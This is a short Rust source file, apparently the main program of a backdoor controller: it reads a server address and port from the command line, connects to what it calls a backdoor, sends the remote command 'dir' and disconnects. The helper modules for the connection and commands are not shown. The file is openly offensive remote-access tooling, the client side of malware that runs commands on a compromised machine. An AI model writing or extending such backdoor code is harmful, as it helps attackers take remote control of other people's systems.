use connection::connect_to_backdoor;
use std::env;
use std::net::Shutdown;

mod commanding;
mod commands;
mod connection;

fn main() {
    let args: Vec<String> = env::args().collect();

    let server_ip = &args[1];
    let server_port = &args[2];
    let mut stream = connect_to_backdoor(&format!("{}:{}", server_ip, server_port)).unwrap();
    commands::run_command(String::from("dir"), &mut stream).unwrap();
    println!("Disconnecting from backdoor.");
    stream
        .shutdown(Shutdown::Both)
        .expect("Trying to shut down connecting with backdoor failed.");
}
